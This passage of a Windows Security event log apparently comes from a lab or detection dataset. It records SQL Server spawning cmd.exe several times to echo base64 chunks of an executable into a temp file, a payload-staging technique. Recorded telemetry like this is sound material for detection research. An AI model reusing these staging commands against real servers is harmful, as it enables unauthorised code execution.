      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.772247400Z" />
      <EventRecordID>1331351</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xfb0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo APUAAAATAQAAKG51bGwpAAAwMTIzNDU2Nzg5YWJjZGVmAAAAADAxMjM0NTY3ODlBQkNERUYAAAAAMDEyMzQ1Njc4OWFiY2RlZgAAAAAwMTIzNDU2Nzg5QUJDREVGAAAAAAAAAAAAACRAAAAAAAAAJMC4HoXrUbieP5qZmZmZmbk/FCcAADz5QAAZJwAALPlAAB0nAAAY+UAAHicAAAz5QAAmJwAA+PhAACgnAADg+EAAMycAAMj4QAA0JwAArPhAADUnAACM+EAANicAAGz4QAA3JwAATPhAADgnAAA4+EAAOScAABj4QAA6JwAABPhAADsnAADs90AAPCcAAND3QAA9JwAArPdAAD4nAACM90AAPycAAGz3QABAJwAAVPdAAEEnAAA090AAQicAACT3QABDJwAADPdAAEQnAAD09kAARScAAND2QABGJwAAtPZAAEcnAACY9kAASCcAAHz2QABJJwAAZPZAAEonAABA9kAASycAABz2QABMJwAABPZAAE0nAADw9UAATicAAMz1QABPJwAAuPVAAFAnAACo9UAAUScAAJT1QABSJwAAgPVAAFMnAABs9UAAVCcAAFz1QABVJwAASPVAAFYnAAAw9UAAVycAAAz1QABrJwAA7PRAAGwnAADM9EAAbScAALD0QAB1JwAAkPRAAPkqAACA9EAA/CoAAFz0QAAAAAAAAAAAAEphbgBGZWIATWFyAEFwcgBNYXkASnVuAEp1bABBdWcAU2VwAE9jdABOb3YARGVjAFN1bgBNb24AVHVlAFdlZABUaHUARnJpAFNhdAA8AkEAMAJBACgCQQAgAkEAGAJBAAwCQQAwMTIzNDU2Nzg5AAAAAAAAAAAAAAAAAgAAAgAAAAAAAAAAAAAAAAAAAAAAAAEBAgEDAwMDAwMCAQEBAQABAQEBAQEBAQEBAAMCAQICAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAwIDAwEDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEDAgMDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQD5AQEA/NDU2Nzg5Ojs8PUBAQEBAQEAAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGUBAQEBAQBobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:21.774431000Z" />
      <EventRecordID>1331352</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x288</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xfb0</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.047021400Z" />
      <EventRecordID>1331353</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x121c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8AAAAAAAAAAP////8qt0AAPrdAAKzIAAAAAAAAAAAAAB7LAADIwAAA8McAAAAAAAAAAAAAYs8AAAzAAADkxwAAAAAAAAAAAACWzwAAAMAAAITJAAAAAAAAAAAAAKTPAACgwQAAeMkAAAAAAAAAAAAAxM8AAJTBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIzPAABwzwAAAAAAAFLPAABGzwAAOs8AACrPAAAYzwAACM8AAPLOAADezgAAxs4AALrOAACqzgAAks4AAHrOAABezgAATs4AAEDOAAD6ywAACswAACTMAAA+zAAATMwAAF7MAABqzAAAdMwAAIbMAACazAAAsswAAMDMAADazAAA8swAAAzNAAAmzQAAPs0AAGDNAABozQAAes0AAIrNAACgzQAAsM0AAMDNAADSzQAA4M0AAO7NAAAEzgAAFs4AADTOAAAAAAAAxMkAANjLAADGywAAuMsAAKjLAACYywAAhMsAAHjLAABoywAAWMsAAErLAABCywAAOMsAACrLAAAUywAACssAAADLAAD2ygAA7MoAAODKAADYygAAzsoAAMTKAAC0ygAApMoAAJrKAACSygAAiMoAAH7KAAB0ygAAbMoAAGTKAABcygAAUsoAAEjKAAA+ygAANMoAACrKAAAgygAAFsoAAArKAAACygAA+skAAOrJAADgyQAA1skAAMzJAADsywAA3M8AANDPAAAAAAAAus8AALDPAAAAAAAABwAAgAQAAIAJAACANAAAgA4AAIAMAACAFQAAgBcAAIADAACAEgAAgAoAAICXAACAcwAAgHQAAIBvAACAAAAAABMBX2lvYgAAWAJmcHJpbnRmALcCc3RyY2hyAACOAV9wY3R5cGUAYQBfX21iX2N1cl9tYXgAAEkCZXhpdAAAPQJhdG9pAAAVAV9pc2N0eXBlAACeAnByaW50ZgAArwJzaWduYWwAAJECbWFsbG9jAABAAmNhbGxvYwAATwJmZmx1c2gAAEwCZmNsb3NlAACcAnBlcnJvcgAAVwJmb3BlbgCkAnFzb3J0APEAX2Z0b2wAwQJzdHJuY3B5AMUCc3Ryc3RyAADAAnN0cm5jbXAAXgJmcmVlAADIAF9lcnJubwAAegBfX3BfX3dlbnZpcm9uAG0AX19wX19lbnZpcm9uAACnAnJlYWxsb2MAxAJzdHJzcG4AAJsCbW9kZgAAvAJzdHJlcnJvcgAA4wJ3Y3NjcHkAAOYCd2NzbGVuAACzAF9jbG9zZQAA6AJ3Y3NuY21wAMMCc3RycmNocgBNU1ZDUlQuZGxsAABVAF9fZGxsb25leGl0AIYBX29u&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.049223300Z" />
      <EventRecordID>1331354</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xde0</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x121c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.320296500Z" />
      <EventRecordID>1331355</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xce4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ZXhpdADTAF9leGl0AEgAX1hjcHRGaWx0ZXIAZABfX3BfX19pbml0ZW52AFgAX19nZXRtYWluYXJncwAPAV9pbml0dGVybQCDAF9fc2V0dXNlcm1hdGhlcnIAAJ0AX2FkanVzdF9mZGl2AABqAF9fcF9fY29tbW9kZQAAbwBfX3BfX2Ztb2RlAACBAF9fc2V0X2FwcF90eXBlAADKAF9leGNlcHRfaGFuZGxlcjMAALcAX2NvbnRyb2xmcAAAHQNTZXRMYXN0RXJyb3IAAO4ARnJlZUVudmlyb25tZW50U3RyaW5nc1cATwFHZXRFbnZpcm9ubWVudFN0cmluZ3NXAAD1AUdsb2JhbEZyZWUAAAkBR2V0Q29tbWFuZExpbmVXAFYDVGxzQWxsb2MAAFcDVGxzRnJlZQCMAER1cGxpY2F0ZUhhbmRsZQA6AUdldEN1cnJlbnRQcm9jZXNzABoDU2V0SGFuZGxlSW5mb3JtYXRpb24AAC4AQ2xvc2VIYW5kbGUAwAFHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQC8AEZpbGVUaW1lVG9TeXN0ZW1UaW1lAADYAUdldFRpbWVab25lSW5mb3JtYXRpb24AALsARmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUATgNTeXN0ZW1UaW1lVG9GaWxlVGltZQAATwNTeXN0ZW1UaW1lVG9UelNwZWNpZmljTG9jYWxUaW1lAEkDU2xlZXAA6gBGb3JtYXRNZXNzYWdlQQAAaQFHZXRMYXN0RXJyb3IAAIUDV2FpdEZvclNpbmdsZU9iamVjdABJAENyZWF0ZUV2ZW50QQAALANTZXRTdGRIYW5kbGUAABADU2V0RmlsZVBvaW50ZXIAAE0AQ3JlYXRlRmlsZUEAUABDcmVhdGVGaWxlVwCMAUdldE92ZXJsYXBwZWRSZXN1bHQAgwBEZXZpY2VJb0NvbnRyb2wAWgFHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZQAAUgJMb2NhbEZyZWUAXgFHZXRGaWxlVHlwZQBaAENyZWF0ZU11dGV4QQAAGQJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAHoARGVsZXRlQ3JpdGljYWxTZWN0aW9uAI8ARW50ZXJDcml0aWNhbFNlY3Rpb24AALgCUmVsZWFzZU11dGV4AAALA1NldEV2ZW50AABHAkxlYXZlQ3JpdGljYWxTZWN0aW9uAABRA1Rlcm1pbmF0ZVByb2Nlc3MAAFIBR2V0RXhpdENvZGVQcm9jZXNzAADfAUdldFZlcnNpb25FeEEAmAFHZXRQcm9jQWRkcmVzcwAASAJMb2FkTGlicmFyeUEAAJcDV3JpdGVGaWxlAKsCUmVhZEZpbGUAAIcCUGVla05hbWVkUGlwZQBLRVJORUwzMi5kbGwAAB0AQWxsb2NhdGVBbmRJbml0aWFsaXplU2lkAADhAEZy&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.322705200Z" />
      <EventRecordID>1331356</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1394</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xce4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.593700100Z" />
      <EventRecordID>1331357</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x20</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo ZWVTaWQAQURWQVBJMzIuZGxsAABXU09DSzMyLmRsbAA5AFdTQVNlbmQANABXU0FSZWN2AFdTMl8zMi5kbGwAAMUBX3N0cm5pY21wAL8BX3N0cmR1cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAZAAAAAEAAAABAAAAAQAAAAAAAACAw8kBAAAAAOALQQAyAAAAQgAAAEsAAABQAAAAWgAAAF8AAABiAAAAYwAAAGQAAAAlczogQ2Fubm90IHVzZSBjb25jdXJyZW5jeSBsZXZlbCBncmVhdGVyIHRoYW4gdG90YWwgbnVtYmVyIG9mIHJlcXVlc3RzCgAlczogSW52YWxpZCBDb25jdXJyZW5jeSBbUmFuZ2UgMC4uJWRdCgAAJXM6IGludmFsaWQgVVJMCgAAAAAlczogd3JvbmcgbnVtYmVyIG9mIGFyZ3VtZW50cwoAAFVzZXItQWdlbnQ6AEFjY2VwdDoASG9zdDoAAABQcm94eS1BdXRob3JpemF0aW9uOiBCYXNpYyAAUHJveHkgY3JlZGVudGlhbHMgdG9vIGxvbmcKAEF1dGhvcml6YXRpb246IEJhc2ljIAAAAEF1dGhlbnRpY2F0aW9uIGNyZWRlbnRpYWxzIHRvbyBsb25nCgAAAABDb29raWU6IAAAAAANCgAAQ2Fubm90IG1peCBQVVQgYW5kIEhFQUQKAAAAAENhbm5vdCBtaXggUE9TVCBhbmQgSEVBRAoAAABDYW5ub3QgbWl4IFBPU1QvUFVUIGFuZCBIRUFECgAAAEludmFsaWQgbnVtYmVyIG9mIHJlcXVlc3RzCgBuOmM6dDpiOlQ6cDp1OnY6cmtWaHdpeDp5Ono6QzpIOlA6QTpnOlg6ZGU6U3EAAABiZ2NvbG9yPXdoaXRlAAAAVG90YWwgb2YgJWQgcmVxdWVzdHMgY29tcGxldGVkCgAlcwoALi5kb25lCgBGaW5pc2hlZCAlZCByZXF1ZXN0cwoAAABhcHJfc29ja2V0X2Nvbm5lY3QoKQAAAAAKVGVzdCBhYm9ydGVkIGFmdGVyIDEwIGZhaWx1cmVzCgoAAAAKU2VydmVyIHRpbWVkIG91dAoKAGFwcl9wb2xsAAAAAGFwcl9zb2NrYWRkcl9pbmZvX2dldCgpIGZvciAlcwAAZXJyb3IgY3JlYXRpbmcgcmVxdWVzdCBidWZmZXI6IG91dCBvZiBtZW1vcnkKAAAASU5GTzogJXMgaGVhZGVyID09IAotLS0KJXMKLS0tCgBSZXF1ZXN0IHRvbyBsb25nCgAAACVzICVzIEhUVFAvMS4wDQolcyVzJXNDb250ZW50LWxlbmd0aDogJXUNCkNvbnRlbnQtdHlwZTogJXMNCiVzDQoAAAAAUFVUAFBPU1QAAAAAdGV4dC9wbGFpbgAAJXMgJXMgSFRUUC8xLjAN&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.595943800Z" />
      <EventRecordID>1331358</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1250</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x20</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.867294700Z" />
      <EventRecordID>1331359</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xc6c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo CiVzJXMlcyVzDQoAAEhFQUQAAAAAR0VUAENvbm5lY3Rpb246IEtlZXAtQWxpdmUNCgAAAABBY2NlcHQ6ICovKg0KAAAAVXNlci1BZ2VudDogQXBhY2hlQmVuY2gvAAAAADIuMwBIb3N0OiAAAGFwcl9wb2xsc2V0X2NyZWF0ZSBmYWlsZWQAAAAoYmUgcGF0aWVudCklcwAALi4uAAoAAABbdGhyb3VnaCAlczolZF0gAAAAAEJlbmNobWFya2luZyAlcyAAAAAAJXM6ICVzICglZCkKAAAAAFNlbmQgcmVxdWVzdCBmYWlsZWQhCgAAAFNlbmQgcmVxdWVzdCB0aW1lZCBvdXQhCgAAAAAlcwklSTY0ZAklSTY0ZAklSTY0ZAklSTY0ZAklSTY0ZAoAAABzdGFydHRpbWUJc2Vjb25kcwljdGltZQlkdGltZQl0dGltZQl3YWl0CgAAAENhbm5vdCBvcGVuIGdudXBsb3Qgb3V0cHV0IGZpbGUAJWQsJS4zZgoAAAAAUGVyY2VudGFnZSBzZXJ2ZWQsVGltZSBpbiBtcwoAAABDYW5ub3Qgb3BlbiBDU1Ygb3V0cHV0IGZpbGUAdwAAACAgJWQlJSAgJTVJNjRkCgAgMTAwJSUgICU1STY0ZCAobG9uZ2VzdCByZXF1ZXN0KQoAAAAgMCUlICA8MD4gKG5ldmVyKQoAAApQZXJjZW50YWdlIG9mIHRoZSByZXF1ZXN0cyBzZXJ2ZWQgd2l0aGluIGEgY2VydGFpbiB0aW1lIChtcykKAABUb3RhbDogICAgICAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAABQcm9jZXNzaW5nOiAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAABDb25uZWN0OiAgICAlNUk2NGQgJTVJNjRkJTVJNjRkCgAAAAAgICAgICAgICAgICAgIG1pbiAgIGF2ZyAgIG1heAoAAFdBUk5JTkc6IFRoZSBtZWRpYW4gYW5kIG1lYW4gZm9yIHRoZSB0b3RhbCB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRoZXNlIHJlc3VsdHMgYXJlIHByb2JhYmx5IG5vdCB0aGF0IHJlbGlhYmxlLgoAAAAAAAAAAEVSUk9SOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgdG90YWwgdGltZSBhcmUgbW9yZSB0aGFuIHR3aWNlIHRoZSBzdGFuZGFyZAogICAgICAgZGV2aWF0aW9uIGFwYXJ0LiBUaGVzZSByZXN1bHRzIGFyZSBOT1QgcmVsaWFibGUuCgBXQVJOSU5HOiBUaGUgbWVkaWFuIGFuZCBtZWFuIGZvciB0aGUgd2FpdGluZyB0aW1lIGFyZSBub3Qgd2l0aGluIGEgbm9ybWFsIGRldmlhdGlvbgogICAgICAgIFRo&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:22.869550600Z" />
      <EventRecordID>1331360</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x11f8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xc6c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
